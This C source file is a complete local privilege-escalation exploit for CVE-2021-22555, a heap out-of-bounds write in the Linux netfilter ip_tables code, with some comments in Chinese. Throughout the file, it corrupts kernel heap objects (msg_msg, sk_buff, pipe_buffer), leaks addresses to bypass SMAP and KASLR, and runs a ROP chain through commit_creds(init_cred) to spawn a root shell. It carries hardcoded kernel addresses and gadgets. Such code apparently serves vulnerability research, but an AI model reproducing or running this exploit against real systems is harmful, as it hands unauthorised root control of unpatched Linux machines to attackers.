// clang-format off
#define _GNU_SOURCE
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h> 
#include <net/if.h>
#include <netinet/in.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <linux/netfilter_ipv4/ip_tables.h>
// clang-format on

#define PAGE_SIZE 0x1000
#define PRIMARY_SIZE 0x1000
#define SECONDARY_SIZE 0x400

#define NUM_SOCKETS 4
#define NUM_SKBUFFS 128
#define PIPE_NUMS 256
#define MSG_QUEUE_NUM 4096

#define HOLE_STEP 1024

#define MTYPE_PRIMARY 0x41
#define MTYPE_SECONDARY 0x42
#define MTYPE_FAKE 0x1337

#define MSG_TAG 0xAAAAAAAA

#define SKB_SHARED_INFO_SIZE 0x140
#define MSG_MSG_SIZE (sizeof(struct msg_msg))
#define MSG_MSGSEG_SIZE (sizeof(struct msg_msgseg))

#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_DEFAULT "\033[0m"

#define logd(fmt, ...) \
  fprintf(stderr, "[*] %s:%d " fmt "\n", __FILE__, __LINE__, ##__VA_ARGS__)

#define logi(fmt, ...)                                                       \
  fprintf(stderr, COLOR_GREEN "[+] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
          __LINE__, ##__VA_ARGS__)

#define logw(fmt, ...)                                                        \
  fprintf(stderr, COLOR_YELLOW "[!] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
          __LINE__, ##__VA_ARGS__)

#define loge(fmt, ...)                                                     \
  fprintf(stderr, COLOR_RED "[-] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
          __LINE__, ##__VA_ARGS__)

#define die(fmt, ...)                  \
  do {                                 \
    loge(fmt, ##__VA_ARGS__);          \
    loge("Exit at line %d", __LINE__); \
    sleep(2);                          \
    exit(1);                           \
  } while (0)

// #define DEBUG

struct msg_msg {
  uint64_t m_list_next;
  uint64_t m_list_prev;
  uint64_t m_type;
  uint64_t m_ts;
  uint64_t next;
  uint64_t security;
};

struct msg_msgseg {
  uint64_t next;
};

struct pipe_buffer {
  uint64_t page;
  uint32_t offset;
  uint32_t len;
  uint64_t ops;
  uint32_t flags;
  uint32_t pad;
  uint64_t private;
};

struct pipe_buf_operations {
  uint64_t confirm;
  uint64_t release;
  uint64_t steal;
  uint64_t get;
};

struct {
  long mtype;
  char mtext[PRIMARY_SIZE - MSG_MSG_SIZE];
} primary_msg;

struct {
  long mtype;
  char mtext[SECONDARY_SIZE - MSG_MSG_SIZE];
} secondary_msg;

struct {
  long mtype;
  char mtext[PAGE_SIZE - MSG_MSG_SIZE + PAGE_SIZE - MSG_MSGSEG_SIZE];
} fake_msg;

void build_msg_msg(struct msg_msg *msg, uint64_t m_list_next,
                   uint64_t m_list_prev, uint64_t m_ts, uint64_t next) {
  msg->m_list_next = m_list_next;
  msg->m_list_prev = m_list_prev;
  msg->m_type = MTYPE_FAKE;
  msg->m_ts = m_ts;
  msg->next = next;
  msg->security = 0;
}

int send_msg(int msgqid, const void *msgp, size_t msgsz, long msgtyp) {
  *(long *)msgp = msgtyp;
  if (msgsnd(msgqid, msgp, msgsz - sizeof(long), 0) < 0) {
    loge("msgsnd");
    return -1;
  }
  return 0;
}

int peek_msg(int msgqid, void *msgp, size_t msgsz, long msgtyp) {
  if (msgrcv(msgqid, msgp, msgsz - sizeof(long), msgtyp,
             MSG_COPY | IPC_NOWAIT) < 0) {
    loge("msgrcv");
    return -1;
  }
  return 0;
}

int recv_msg(int msgqid, void *msgp, size_t msgsz, long msgtyp) {
  if (msgrcv(msgqid, msgp, msgsz - sizeof(long), msgtyp, 0) < 0) {
    loge("msgrcv");
    return -1;
  }
  return 0;
}

int spray_skbuff(int ss[NUM_SOCKETS][2], const void *buf, size_t size) {
  for (int i = 0; i < NUM_SOCKETS; i++) {
    for (int j = 0; j < NUM_SKBUFFS; j++) {
      if (write(ss[i][0], buf, size) < 0) {
        loge("write");
        return -1;
      }
    }
  }
  return 0;
}

int free_skbuff(int ss[NUM_SOCKETS][2], void *buf, size_t size) {
  for (int i = 0; i < NUM_SOCKETS; i++) {
    for (int j = 0; j < NUM_SKBUFFS; j++) {
      if (read(ss[i][1], buf, size) < 0) {
        loge("read");
        return -1;
      }
    }
  }
  return 0;
}

int trigger_oob_write(int s) {
  struct __attribute__((__packed__)) {
    struct ipt_replace replace;
    struct ipt_entry entry;
    struct xt_entry_match match;
    char pad[0x108 + PRIMARY_SIZE - 0x200 - 0x2];
    struct xt_entry_target target;
  } data = {0};

  data.replace.num_counters = 1;
  data.replace.num_entries = 1;
  data.replace.size = (sizeof(data.entry) + sizeof(data.match) +
                       sizeof(data.pad) + sizeof(data.target));

  data.entry.next_offset = (sizeof(data.entry) + sizeof(data.match) +
                            sizeof(data.pad) + sizeof(data.target));
  data.entry.target_offset =
      (sizeof(data.entry) + sizeof(data.match) + sizeof(data.pad));

  data.match.u.user.match_size = (sizeof(data.match) + sizeof(data.pad));
  strcpy(data.match.u.user.name, "icmp");
  data.match.u.user.revision = 0;

  data.target.u.user.target_size = sizeof(data.target);
  strcpy(data.target.u.user.name, "NFQUEUE");
  data.target.u.user.revision = 1;

  // partial overwrite the next object
  //  int setsockopt(int sockfd, int level, int optname, const void *optval,
  //                  socklen_t optlen);
  if (setsockopt(s, SOL_IP, IPT_SO_SET_REPLACE, &data, sizeof(data)) != 0) {
    if (errno == ENOPROTOOPT) {
      loge("ip_tables module is not loaded.");
      return -1;
    }
  }
  return 0;
}

// nokaslr
// from /proc/kallsyms
// or System.map
uint64_t prepare_kernel_cred = 0xffffffff810d1350;
uint64_t init_cred = 0xffffffff82663be0;
uint64_t commit_creds = 0xffffffff810d0ec0;
uint64_t swapgs_restore_regs_and_return_to_usermode = 0xffffffff81c00f30;
uint64_t anon_pipe_buf_ops = 0xffffffff820763c0;
uint64_t startup_64 = 0xffffffff81000000;
// ROPgadget
uint64_t pop_rdi_ret = 0xffffffff8108fd70;

size_t user_cs, user_ss, user_eflags, user_esp;
void save_status() {
  asm volatile(
      "mov %%cs, %0;"
      "mov %%ss, %1;"
      "mov %%esp, %3;"
      "pushf;"
      "pop %2;"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_eflags), "=r"(user_esp)
      :
      : "memory");
  logd("save status");
}

void get_shell() {
  if (getuid()) {
    die("Failed to get the root!");
  }

  logi("Successful to get the root.");
  logd("Execve root shell now...");
  system("/bin/sh");
  exit(0);
}

void debug() {
  puts("debug");
  getchar();
}

void hexdump(const void *data, size_t size) {
  char ascii[17];
  size_t i, j;
  ascii[16] = '\0';
  for (i = 0; i < size; ++i) {
    printf("%02X ", ((unsigned char *)data)[i]);
    if (((unsigned char *)data)[i] >= ' ' &&
        ((unsigned char *)data)[i] <= '~') {
      ascii[i % 16] = ((unsigned char *)data)[i];
    } else {
      ascii[i % 16] = '.';
    }
    if ((i + 1) % 8 == 0 || i + 1 == size) {
      printf(" ");
      if ((i + 1) % 16 == 0) {
        printf("|  %s \n", ascii);
      } else if (i + 1 == size) {
        ascii[(i + 1) % 16] = '\0';
        if ((i + 1) % 16 <= 8) {
          printf(" ");
        }
        for (j = (i + 1) % 16; j < 16; ++j) {
          printf("   ");
        }
        printf("|  %s \n", ascii);
      }
    }
  }
}

int setup_sandbox(void) {
  if (unshare(CLONE_NEWUSER) < 0) {
    loge("unshare(CLONE_NEWUSER)");
    return -1;
  }
  if (unshare(CLONE_NEWNET) < 0) {
    loge("[-] unshare(CLONE_NEWNET)");
    return -1;
  }

  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(0, &set);
  if (sched_setaffinity(getpid(), sizeof(set), &set) < 0) {
    loge("[-] sched_setaffinity");
    return -1;
  }
  return 0;
}

int main(int argc, char *argv[]) {
  save_status();

  int s;
  int fd;
  int ss[NUM_SOCKETS][2];
  int pipe_fd[PIPE_NUMS][2];
  int msgqid[MSG_QUEUE_NUM];

  // sk_buff，需要减去共享部分，这一部分在 尾部 SKB_SHARED_INFO_SIZE := 0x140
  char primary_buf[PRIMARY_SIZE - SKB_SHARED_INFO_SIZE];
  char secondary_buf[SECONDARY_SIZE - SKB_SHARED_INFO_SIZE];

  signal(SIGSEGV, get_shell);

  struct msg_msg *msg;
  struct pipe_buf_operations *ops;
  struct pipe_buffer *buf;

  uint64_t pipe_buffer_ops = 0;
  uint64_t kernel_heap_addr = 0, kernel_base = 0;
  uint64_t kernel_offset = 0;

  int victim_idx = -1, real_idx = -1;

  logw("CVE-2021-22555");

  logi("set up namespace sandbox...");
  if (setup_sandbox() < 0) die("sandbox");

  logi("prepare sockets and message queues...");
  if ((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
    die("socket");
  }

  for (int i = 0; i < NUM_SOCKETS; i++) {
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, ss[i]) < 0) {
      die("socketpair");
    }
  }

  for (int i = 0; i < MSG_QUEUE_NUM; i++) {
    if ((msgqid[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666)) < 0) {
      die("msgget");
    }
  }

  logi("STAGE 1: memory corruption");

  logi("spraying primary and secondary messages");
  for (int i = 0; i < MSG_QUEUE_NUM; i++) {
    memset(&primary_msg, 0, sizeof(primary_msg));
    *(int *)&primary_msg.mtext[0] = MSG_TAG;
    *(int *)&primary_msg.mtext[4] = i;
    if (send_msg(msgqid[i], &primary_msg, sizeof(primary_msg), MTYPE_PRIMARY) <
        0)
      die("send_msg");
  }
  for (int i = 0; i < MSG_QUEUE_NUM; i++) {
    memset(&secondary_msg, 0, sizeof(secondary_msg));
    *(int *)&secondary_msg.mtext[0] = MSG_TAG;
    *(int *)&secondary_msg.mtext[4] = i;
    if (send_msg(msgqid[i], &secondary_msg, sizeof(secondary_msg),
                 MTYPE_SECONDARY) < 0)
      die("send_msg");
  }

  logi("creating holes in primary messages => 0 1024 2048 3072");
  for (int i = 0; i < MSG_QUEUE_NUM; i += HOLE_STEP) {
    if (recv_msg(msgqid[i], &primary_msg, sizeof(primary_msg), MTYPE_PRIMARY) <
        0)
      die("recv_msg");
  }

  logi("triggering out-of-bounds write...");
  if (trigger_oob_write(s) < 0) die("trigger");
  ;

  logd("searching for corrupted primary message...");
  // 如果主消息和辅助消息 mtext[4]: 先前写入的 index 不同
  // 则表示主消息msg_msg->m_list->next成员被修改， mtext[0]
  for (int i = 0; i < MSG_QUEUE_NUM; i++) {
    if ((i % HOLE_STEP) == 0) continue;
    if (peek_msg(msgqid[i], &secondary_msg, sizeof(secondary_msg), 1) < 0)
      die("peek_msg");
    if (*(int *)&secondary_msg.mtext[0] != MSG_TAG) {
      die("could not corrupt any primary message.");
    }
    if (*(int *)&secondary_msg.mtext[4] != i) {
      victim_idx = i;
      real_idx = *(int *)&secondary_msg.mtext[4];
      break;
    }
  }

  if (victim_idx == -1 && real_idx == -1) {
    die("could not corrupt any primary message.");
  }

  logd("victim_idx: %#x", victim_idx);
  logd("real_idx: %#x", real_idx);

#ifdef DEBUG
  debug();
#endif

  logi("[+] STAGE 2: SMAP bypass");

  // 两个 primary msg 指向 同一个 secondary msg
  // free 掉一个 second_msg 被 free
  logi("free real secondary message...");
  if (recv_msg(msgqid[real_idx], &secondary_msg, sizeof(secondary_msg),
               MTYPE_SECONDARY) < 0)
    die("recv_msg");

  logd("spraying fake secondary messages...");
  memset(secondary_buf, 0, sizeof(secondary_buf));
  // 因为 struct msgseg next 指向地址问题, size 不能 大于 0x1000
  build_msg_msg((void *)secondary_buf, 0x41414141, 0x42424242,
                PAGE_SIZE - MSG_MSG_SIZE, 0);
  if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) < 0)
    die("spray_skbuff");

  logd("leaking adjacent secondary message...");
  // 相邻的 secondary msg 的内容
  if (peek_msg(msgqid[victim_idx], &fake_msg, sizeof(fake_msg), 1) < 0)
    die("peek_msg");

  if (*(int *)&fake_msg.mtext[SECONDARY_SIZE] != MSG_TAG) {
    die("could not leak adjacent secondary message");
  }

  msg = (struct msg_msg *)&fake_msg.mtext[SECONDARY_SIZE - MSG_MSG_SIZE];
  kernel_heap_addr = msg->m_list_next;
  if (kernel_heap_addr & (PRIMARY_SIZE - 1))
    kernel_heap_addr = msg->m_list_prev;
  logd("heap addr(next primary_msg): %#llx", kernel_heap_addr);

  if ((kernel_heap_addr & 0xFFFF000000000000) != 0xFFFF000000000000) {
    die("kernel heap address is incorrect.");
  }

#ifdef DEBUG
  debug();
#endif

  logd("freeing fake secondary messages...");
  free_skbuff(ss, secondary_buf, sizeof(secondary_buf));

  logd("spraying fake secondary messages...");
  memset(secondary_buf, 0, sizeof(secondary_buf));

  // read 0x2000 - msg_msg - msg_seg
  // next primary msg
  build_msg_msg((void *)secondary_buf, 0x41414141, 0x42424242,
                sizeof(fake_msg.mtext), kernel_heap_addr - MSG_MSGSEG_SIZE);
  if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) < 0)
    die("spray skbuff");

  logd("leaking next primary message content");
  if (peek_msg(msgqid[victim_idx], &fake_msg, sizeof(fake_msg), 1) < 0)
    die("peek_msg");

  // hexdump(fake_msg.mtext, 0x1000);

  if (*(int *)&fake_msg.mtext[PAGE_SIZE] != MSG_TAG) {
    die("could not leak primary message.");
  }

  msg = (struct msg_msg *)&fake_msg.mtext[PAGE_SIZE - MSG_MSG_SIZE];
  kernel_heap_addr = msg->m_list_next;
  if (kernel_heap_addr & (SECONDARY_SIZE - 1))
    kernel_heap_addr = msg->m_list_prev;

  kernel_heap_addr -= SECONDARY_SIZE;
  logi("kernel_heap_addr(victim secondary_msg): %#llx", kernel_heap_addr);
  if ((kernel_heap_addr & 0xFFFF00000000FFFF) != 0xFFFF000000000000) {
    die("kernel heap address is incorrect.");
  }

#ifdef DEBUG
  debug();
#endif

  logi("STAGE 3: KASLR bypass");

  logd("freeing fake secondary messages...");
  free_skbuff(ss, secondary_buf, sizeof(secondary_buf));

  logd("spraying fake secondary messages");
  memset(secondary_buf, 0, sizeof(secondary_buf));
  build_msg_msg((void *)secondary_buf, kernel_heap_addr, kernel_heap_addr, 0,
                0);
  if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) < 0)
    die("spray_skbuff");

  logd("freeing sk_buff data buffer...");
  if (recv_msg(msgqid[victim_idx], &fake_msg, sizeof(fake_msg), MTYPE_FAKE) < 0)
    die("recv_msg");

  logd("spraying pipe_buffer objects...");
  for (int i = 0; i < PIPE_NUMS; i++) {
    if (pipe(pipe_fd[i]) < 0) {
      die("pipe");
    }
    if (write(pipe_fd[i][1], "pwn", 3) < 0) {
      die("write");
    }
  }

  logd("leaking and freeing pipe_buffer object...");
  for (int i = 0; i < NUM_SOCKETS; i++) {
    for (int j = 0; j < NUM_SKBUFFS; j++) {
      if (read(ss[i][1], secondary_buf, sizeof(secondary_buf)) < 0) {
        die("read ss");
      }
      if (*(uint64_t *)&secondary_buf[0x10] != MTYPE_FAKE)
        pipe_buffer_ops = *(uint64_t *)&secondary_buf[0x10];
    }
  }
  logd("pipe_buffer_ops: %#llx", pipe_buffer_ops);

#ifdef DEBUG
  debug();
#endif

  uint64_t offset = anon_pipe_buf_ops - startup_64;
  kernel_base = pipe_buffer_ops - offset;
  kernel_offset = kernel_base - startup_64;
  logd("[+] anon_pipe_buf_ops: %#llx", pipe_buffer_ops);
  logd("[+] kernel_base: %#llx", kernel_base);
  logd("kernel_offset: %#llx", kernel_offset);

#ifdef DEBUG
  debug();
#endif

  logi("use pipe_buffer release construct rop chain");
  memset(secondary_buf, 0, sizeof(secondary_buf));
  buf = (struct pipe_buffer *)secondary_buf;
  buf->page = *(uint64_t *)"PWN!";
  buf->ops = kernel_heap_addr;

  ops = (struct pipe_buf_operations *)secondary_buf;
  ops->release = kernel_offset +
                 0xffffffff81711cfc;  // push rsi ; jmp qword ptr [rsi + 0x39]

  *(uint64_t *)&secondary_buf[0x39] =
      kernel_offset + 0xffffffff8100cd38;  // pop rsp ret
  ops->confirm = 0xffffffff810724d9;       // add rsp, 0xd0 ; ret

  uint64_t rop_idx = 0;
  uint64_t *rop_chain = (uint64_t *)&secondary_buf[0xd8];
  rop_chain[rop_idx++] = kernel_offset + pop_rdi_ret;
  rop_chain[rop_idx++] = kernel_offset + init_cred;
  rop_chain[rop_idx++] = kernel_offset + commit_creds;
  rop_chain[rop_idx++] =
      kernel_offset + swapgs_restore_regs_and_return_to_usermode + 22;

  rop_chain[rop_idx++] = *(uint64_t *)"PWN!";
  rop_chain[rop_idx++] = *(uint64_t *)"PWN!";
  // rop_chain[rop_idx++] = kernel_offset + 0xffffffff8107b3c0;  // swapgs
  //   >>> hex(elf.search(asm('iretq')).__next__())
  //        0xffffffff8103be2b
  // rop_chain[rop_idx++] = kernel_offset + 0xffffffff8103be2b;  // iretq
  rop_chain[rop_idx++] = get_shell;
  rop_chain[rop_idx++] = user_cs;
  rop_chain[rop_idx++] = user_eflags;
  rop_chain[rop_idx++] = user_esp;
  rop_chain[rop_idx++] = user_ss;

  logd("spray sk_buff to hijack pipe_buffer...");
  if (spray_skbuff(ss, secondary_buf, sizeof(secondary_buf)) < 0)
    die("failed to spray sk_buff!");

  logi("STAGE 4: trigger fake ops->release to hijack RIP...");

#ifdef DEBUG
  logd("getshell addr : %p", get_shell);
  debug();
#endif

  for (int i = 0; i < PIPE_NUMS; i++) {
    close(pipe_fd[i][0]);
    close(pipe_fd[i][1]);
  }

  return EXIT_SUCCESS;
}